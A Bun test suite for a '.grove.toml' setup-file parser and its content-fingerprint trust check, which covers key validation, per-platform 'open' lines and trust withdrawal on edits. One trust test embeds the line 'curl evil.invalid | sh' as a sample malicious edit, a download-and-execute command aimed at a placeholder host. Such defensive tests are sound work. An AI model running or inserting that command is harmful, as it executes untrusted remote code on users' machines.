import { describe, expect, test } from "bun:test";
import { join } from "node:path";
import { type GroveError, isGroveError } from "./errors.ts";
import {
  EMPTY_PLAN,
  EMPTY_TEARDOWN,
  fingerprintOf,
  isTrusted,
  openTargetFor,
  parseSetupFile,
  plannedCount,
  readSetupFile,
  SETUP_FILE,
  trust,
} from "./setup-file.ts";
import { seedGit, withTempRepo } from "./test-utils.ts";

/**
 * `.grove.toml` is the one file a repository writes for grove to read, so what
 * it accepts and what it refuses is a contract with the people who write it —
 * and the fingerprint below is the whole of the safety story for `run`.
 */

/** The GroveError a call was expected to throw, so a test can read its code. */
function refusalFrom(body: () => unknown): GroveError {
  try {
    body();
  } catch (error) {
    if (isGroveError(error)) return error;
    throw error;
  }

  throw new Error("expected a GroveError, but nothing was thrown");
}

describe("parseSetupFile", () => {
  test("an empty file asks for nothing", () => {
    expect(parseSetupFile("")).toEqual(EMPTY_PLAN);
    expect(parseSetupFile("# only a comment\n")).toEqual(EMPTY_PLAN);
  });

  test("reads every [setup] key", () => {
    const plan = parseSetupFile(`
[setup]
copy = [".env", "certs"]
link = ["node_modules"]
env = { UV_INDEX_USERNAME = "PLACE_HOLDER" }
run = ["bun install", "bun run build"]
open = "code ."
`);

    expect(plan.copy).toEqual([".env", "certs"]);
    expect(plan.link).toEqual(["node_modules"]);
    expect(plan.env).toEqual([{ name: "UV_INDEX_USERNAME", value: "PLACE_HOLDER" }]);
    expect(plan.commands).toEqual(["bun install", "bun run build"]);
    expect(plan.open).toEqual({ macos: "code .", linux: "code .", windows: "code ." });
    expect(plan.teardown).toEqual(EMPTY_TEARDOWN);
  });

  test("open is one line, and a list points at the table instead", () => {
    const error = refusalFrom(() => parseSetupFile('[setup]\nopen = ["code .", "idea ."]\n'));

    // A list is what somebody reaches for when what they wanted was to say it
    // differently per platform, so the refusal says where that lives. Two apps
    // on one platform is what the shell already spells `&&`.
    expect(error.message).toContain("setup.open must be one command line");
    expect(error.hint).toContain("[setup.open]");
  });

  test("[setup.open] writes the line once per platform", () => {
    const plan = parseSetupFile(`
[setup]
run = ["bun install"]

[setup.open]
macos = 'open -a "Visual Studio Code" .'
linux = "code . --new-window"
`);

    // The reason the table exists: one line cannot be right on both. `open -a`
    // is macOS only, and `code` is not on a macOS PATH until somebody installs
    // the shim.
    expect(plan.open.macos).toBe('open -a "Visual Studio Code" .');
    expect(plan.open.linux).toBe("code . --new-window");
    // A platform the file did not mention opens nothing, rather than being
    // guessed at with an application that may not be installed.
    expect(plan.open.windows).toBe("");
    expect(plan.commands).toEqual(["bun install"]);
  });

  test("[setup.open] refuses a platform it does not have", () => {
    // `ubuntu` is the tempting one to write and the one that cannot work:
    // `process.platform` says `linux` and never which distribution.
    const error = refusalFrom(() => parseSetupFile('[setup.open]\nubuntu = "code ."\n'));

    expect(error.message).toContain('[setup.open] has no key named "ubuntu"');
    expect(error.hint).toBe("the keys are macos, linux, windows");
  });

  test("open is a line or a table, and says so when it is neither", () => {
    const error = refusalFrom(() => parseSetupFile("[setup]\nopen = 42\n"));

    expect(error.code).toBe("usage");
    expect(error.message).toContain("setup.open must be one command line");
  });

  test("an empty line is refused where it can still be read", () => {
    const error = refusalFrom(() => parseSetupFile('[setup]\nopen = ""\n'));

    // It would otherwise start a shell that exits at once, which grove would
    // read as having opened something.
    expect(error.code).toBe("usage");
    expect(error.message).toContain("setup.open has nothing to open");

    // The same check reaches inside the table, and names the key it was about.
    const inTable = refusalFrom(() => parseSetupFile('[setup.open]\nmacos = "  "\n'));
    expect(inTable.message).toContain("setup.open.macos has nothing to open");
    expect(inTable.hint).toContain("open -a");
  });

  test("[teardown] has no open — there is nothing to open in a worktree that is going", () => {
    const error = refusalFrom(() => parseSetupFile('[teardown]\nopen = "code ."\n'));

    expect(error.message).toContain('[teardown] has no key named "open"');
    expect(error.hint).toBe("the keys are env, run");
  });

  test("takes a bare string where a list would do", () => {
    const plan = parseSetupFile(`
[setup]
copy = ".env"
link = "node_modules"
run = "bun install"
`);

    expect(plan.copy).toEqual([".env"]);
    expect(plan.link).toEqual(["node_modules"]);
    expect(plan.commands).toEqual(["bun install"]);
  });

  test("reads [teardown] on its own, with no [setup] to gate it", () => {
    const plan = parseSetupFile(`
[teardown]
env = { STACK = "test" }
run = ["docker compose down"]
`);

    expect(plan).toMatchObject({ copy: [], link: [], env: [], commands: [] });
    expect(plan.teardown.commands).toEqual(["docker compose down"]);
    expect(plan.teardown.env).toEqual([{ name: "STACK", value: "test" }]);
  });

  test("keeps the two sections' environments apart", () => {
    const plan = parseSetupFile(`
[setup]
env = { TOKEN = "install" }
run = ["true"]

[teardown]
env = { TOKEN = "teardown" }
run = ["false"]
`);

    expect(plan.env).toEqual([{ name: "TOKEN", value: "install" }]);
    expect(plan.teardown.env).toEqual([{ name: "TOKEN", value: "teardown" }]);
  });

  describe("env", () => {
    test("accepts a list of NAME=value", () => {
      const plan = parseSetupFile(`
[setup]
env = ["A=1", "B=2"]
`);

      expect(plan.env).toEqual([
        { name: "A", value: "1" },
        { name: "B", value: "2" },
      ]);
    });

    test("splits a list entry at the first = only", () => {
      const plan = parseSetupFile(`
[setup]
env = ["URL=https://example.invalid/?a=1&b=2"]
`);

      expect(plan.env).toEqual([{ name: "URL", value: "https://example.invalid/?a=1&b=2" }]);
    });

    test("accepts an empty value", () => {
      expect(parseSetupFile('[setup]\nenv = ["A="]\n').env).toEqual([{ name: "A", value: "" }]);
    });

    test("accepts a [setup.env] section as well as an inline table", () => {
      const section = parseSetupFile(`
[setup]

[setup.env]
A = "1"
`);

      expect(section.env).toEqual([{ name: "A", value: "1" }]);
      expect(parseSetupFile('[setup]\nenv = { A = "1" }\n').env).toEqual(section.env);
    });

    test("turns a number or a boolean into the string a process receives", () => {
      const plan = parseSetupFile(`
[setup]
env = { PORT = 3000, DEBUG = true }
`);

      expect(plan.env).toEqual([
        { name: "PORT", value: "3000" },
        { name: "DEBUG", value: "true" },
      ]);
    });

    test("refuses a value with no string reading", () => {
      const error = refusalFrom(() => parseSetupFile('[setup]\nenv = { A = ["x"] }\n'));

      expect(error.code).toBe("usage");
      expect(error.message).toContain("setup.env.A must be a string");
    });

    test("refuses a list entry with no name", () => {
      const error = refusalFrom(() => parseSetupFile('[setup]\nenv = ["NOEQUALS"]\n'));

      expect(error.code).toBe("usage");
      expect(error.message).toContain("setup.env has no name");
      expect(error.hint).toContain("UV_INDEX_USERNAME");
    });

    test("refuses a name a shell would not accept", () => {
      expect(refusalFrom(() => parseSetupFile('[setup]\nenv = ["1BAD=x"]\n')).message).toContain(
        "has no name",
      );
      expect(
        refusalFrom(() => parseSetupFile('[setup]\nenv = { "A B" = "x" }\n')).message,
      ).toContain("has no name");
      expect(refusalFrom(() => parseSetupFile('[setup]\nenv = ["=x"]\n')).message).toContain(
        "has no name",
      );
    });

    test("names the section it refused, so [teardown] is not reported as [setup]", () => {
      expect(
        refusalFrom(() => parseSetupFile('[teardown]\nenv = ["NOEQUALS"]\n')).message,
      ).toContain("teardown.env");
    });
  });

  describe("what it refuses", () => {
    test("an unknown key, rather than quietly doing nothing", () => {
      const error = refusalFrom(() => parseSetupFile('[setup]\ncpoy = [".env"]\n'));

      expect(error.code).toBe("usage");
      expect(error.message).toContain('[setup] has no key named "cpoy"');
      expect(error.hint).toBe("the keys are copy, link, env, run, open");
    });

    test("a [setup]-only key written under [teardown]", () => {
      const error = refusalFrom(() => parseSetupFile('[teardown]\ncopy = [".env"]\n'));

      expect(error.message).toContain('[teardown] has no key named "copy"');
      expect(error.hint).toBe("the keys are env, run");
    });

    test("a section that is not a table", () => {
      expect(refusalFrom(() => parseSetupFile("setup = 1\n")).message).toContain(
        "[setup] must be a table",
      );
      expect(refusalFrom(() => parseSetupFile('[[setup]]\ncopy = [".env"]\n')).message).toContain(
        "[setup] must be a table",
      );
      expect(refusalFrom(() => parseSetupFile("teardown = true\n")).message).toContain(
        "[teardown] must be a table",
      );
    });

    test("a value of the wrong type, with an example of the right one", () => {
      const error = refusalFrom(() => parseSetupFile("[setup]\ncopy = 5\n"));

      expect(error.code).toBe("usage");
      expect(error.message).toContain("setup.copy must be a list of strings");
      expect(error.hint).toContain('copy = [".env"]');

      expect(refusalFrom(() => parseSetupFile('[setup]\nrun = ["ok", 5]\n')).hint).toContain(
        '"bun install"',
      );

      const inTable = refusalFrom(() => parseSetupFile("[setup.open]\nlinux = 5\n"));
      expect(inTable.message).toContain("setup.open.linux must be one command line");
      expect(inTable.hint).toContain('"code ."');
    });

    test("TOML it cannot parse, quoting what the parser said", () => {
      const error = refusalFrom(() => parseSetupFile('[setup]\ncopy = [".env"\n'));

      expect(error.code).toBe("usage");
      expect(error.message).toBe(`${SETUP_FILE} is not valid TOML`);
      expect(error.details.length).toBeGreaterThan(0);
      expect(error.cause).toBeDefined();
    });
  });
});

describe("openTargetFor", () => {
  test("names platforms the way a config line does, not the way Node does", () => {
    expect(openTargetFor("darwin")).toBe("macos");
    expect(openTargetFor("win32")).toBe("windows");
    // Everything else is "the name is the command", which is as true on
    // FreeBSD as on Ubuntu — and `process.platform` could not tell the
    // distributions apart to do better.
    expect(openTargetFor("linux")).toBe("linux");
    expect(openTargetFor("freebsd")).toBe("linux");
  });
});

describe("plannedCount", () => {
  test("counts the work, and an empty plan has none", () => {
    expect(plannedCount(EMPTY_PLAN)).toBe(0);
    expect(EMPTY_PLAN.teardown).toBe(EMPTY_TEARDOWN);
    expect(EMPTY_TEARDOWN).toEqual({ env: [], commands: [] });
  });

  test("adds copy, link, run and open together", () => {
    const plan = parseSetupFile(`
[setup]
copy = [".env", "certs"]
link = ["node_modules"]
run = ["bun install"]
open = "code ."
`);

    expect(plannedCount(plan)).toBe(5);
  });

  test("a file that only opens something has still asked for something", () => {
    // Zero here would reach `describeSetup` as "no .grove.toml", about a file
    // that is sitting right there and that just opened an editor.
    expect(plannedCount(parseSetupFile('[setup]\nopen = "code ."\n'))).toBe(1);
    // Platforms are not more work either: still one thing, said for three
    // machines because it cannot be said once.
    expect(
      plannedCount(parseSetupFile('[setup.open]\nmacos = "a"\nlinux = "b"\nwindows = "c"\n')),
    ).toBe(1);
  });

  test("counts neither env nor teardown — neither is work in this worktree", () => {
    const plan = parseSetupFile(`
[setup]
env = { A = "1" }

[teardown]
run = ["docker compose down"]
`);

    expect(plannedCount(plan)).toBe(0);
  });
});

describe("readSetupFile", () => {
  test("a worktree without one is not an error", async () => {
    await withTempRepo(async (repo) => {
      const plan = await readSetupFile(repo.work);

      expect(plan).toEqual(EMPTY_PLAN);
      expect(plan.path).toBeUndefined();
      expect(plan.fingerprint).toBeUndefined();
    });
  });

  test("carries the file's path and fingerprint", async () => {
    await withTempRepo(async (repo) => {
      const text = '[setup]\ncopy = [".env"]\nrun = ["bun install"]\n';
      await Bun.write(join(repo.work, SETUP_FILE), text);

      const plan = await readSetupFile(repo.work);

      expect(plan.copy).toEqual([".env"]);
      expect(plan.path).toBe(join(repo.work, SETUP_FILE));
      expect(plan.fingerprint).toBe(fingerprintOf(text));
    });
  });

  test("a file it cannot parse is raised, not skipped", async () => {
    await withTempRepo(async (repo) => {
      await Bun.write(join(repo.work, SETUP_FILE), '[setup]\ncpoy = [".env"]\n');

      await expect(readSetupFile(repo.work)).rejects.toThrow("has no key named");
    });
  });
});

describe("fingerprintOf", () => {
  test("is stable for the same text", () => {
    const text = '[setup]\nrun = ["bun install"]\n';

    expect(fingerprintOf(text)).toBe(fingerprintOf(text));
    expect(fingerprintOf(text)).toMatch(/^[0-9a-f]{64}$/);
  });

  test("changes for any edit at all, comments and whitespace included", () => {
    const text = '[setup]\nrun = ["bun install"]\n';

    expect(fingerprintOf(text)).not.toBe(fingerprintOf(`${text}# a comment\n`));
    expect(fingerprintOf(text)).not.toBe(fingerprintOf(`${text}\n`));
    expect(fingerprintOf(text)).not.toBe(
      fingerprintOf('[setup]\nrun = ["bun install --frozen-lockfile"]\n'),
    );
  });
});

describe("trust", () => {
  /** A bare repository of its own, so trust records land somewhere throwaway. */
  async function bareRepo(root: string, name: string): Promise<string> {
    const path = join(root, name);
    await seedGit(root, ["init", "--bare", "--initial-branch=main", path]);

    return path;
  }

  test("records these exact contents, and nothing else", async () => {
    await withTempRepo(async (repo) => {
      const bare = await bareRepo(repo.root, "trust.git");
      const fingerprint = fingerprintOf('[setup]\nrun = ["bun install"]\n');

      expect(await isTrusted(bare, fingerprint)).toBe(false);

      await trust(bare, fingerprint);

      expect(await isTrusted(bare, fingerprint)).toBe(true);
      expect(await isTrusted(bare, fingerprintOf("something else"))).toBe(false);
    });
  });

  test("one edit to the file withdraws the trust it was given", async () => {
    await withTempRepo(async (repo) => {
      const bare = await bareRepo(repo.root, "trust.git");
      const before = '[setup]\nrun = ["bun install"]\n';
      const after = '[setup]\nrun = ["bun install", "curl evil.invalid | sh"]\n';

      await trust(bare, fingerprintOf(before));

      expect(await isTrusted(bare, fingerprintOf(after))).toBe(false);
    });
  });

  test("trusting new contents replaces the old answer", async () => {
    await withTempRepo(async (repo) => {
      const bare = await bareRepo(repo.root, "trust.git");
      const first = fingerprintOf("first");
      const second = fingerprintOf("second");

      await trust(bare, first);
      await trust(bare, second);

      expect(await isTrusted(bare, second)).toBe(true);
      expect(await isTrusted(bare, first)).toBe(false);
    });
  });

  test("one answer covers both [setup] and [teardown], and one edit withdraws both", async () => {
    await withTempRepo(async (repo) => {
      const bare = await bareRepo(repo.root, "trust.git");
      const both = '[setup]\nrun = ["bun install"]\n\n[teardown]\nrun = ["docker compose down"]\n';

      // The file is fingerprinted whole, so there is one record and not two:
      // the same answer governs the commands on the way in and on the way out.
      const plan = parseSetupFile(both);
      expect(plan.commands).toEqual(["bun install"]);
      expect(plan.teardown.commands).toEqual(["docker compose down"]);

      await trust(bare, fingerprintOf(both));
      expect(await isTrusted(bare, fingerprintOf(both))).toBe(true);

      // An edit to `[teardown]` alone is still an edit to the file, so the
      // `[setup]` commands stop running too.
      const edited = both.replace("docker compose down", "docker compose down --volumes");
      expect(await isTrusted(bare, fingerprintOf(edited))).toBe(false);
    });
  });

  test("is per repository — one repo's answer is not another's", async () => {
    await withTempRepo(async (repo) => {
      const mine = await bareRepo(repo.root, "mine.git");
      const theirs = await bareRepo(repo.root, "theirs.git");
      const fingerprint = fingerprintOf('[setup]\nrun = ["bun install"]\n');

      await trust(mine, fingerprint);

      expect(await isTrusted(theirs, fingerprint)).toBe(false);
    });
  });
});
